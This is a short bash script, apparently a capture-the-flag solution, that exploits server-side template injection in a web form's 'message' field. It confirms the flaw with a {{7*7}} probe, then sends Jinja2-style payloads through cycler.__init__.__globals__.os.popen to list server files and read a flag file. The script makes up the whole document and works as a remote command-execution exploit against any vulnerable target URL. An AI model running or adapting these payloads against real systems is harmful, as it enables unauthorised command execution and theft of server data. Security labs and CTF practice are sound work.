#!/bin/bash


if [ -z "$1" ]; then
    echo "Usage: $0 <URL>"
    exit 1
fi

URL="$1"

echo "[*] Testing SSTI vulnerability..."


TEST=$(curl -s -X POST "$URL" -d "message={{7*7}}")

if echo "$TEST" | grep -q 49; then
    echo "[+] SSTI confirmed!"
else
    echo "[-] SSTI not confirmed. Check parameter name."
fi

echo
echo "[*] Listing server files..."


LIST_PAYLOAD="{{cycler.__init__.__globals__.os.popen('ls').read()}}"

curl -s -X POST "$URL" \
     --data-urlencode "message=$LIST_PAYLOAD"

echo
echo "[*] Attempting to read flag..."


FLAG_PAYLOAD="{{cycler.__init__.__globals__.os.popen('cat flag').read()}}"

FLAG=$(curl -s -X POST "$URL" \
     --data-urlencode "message=$FLAG_PAYLOAD")

echo
echo "========== FLAG OUTPUT =========="
echo "$FLAG"
echo "================================="
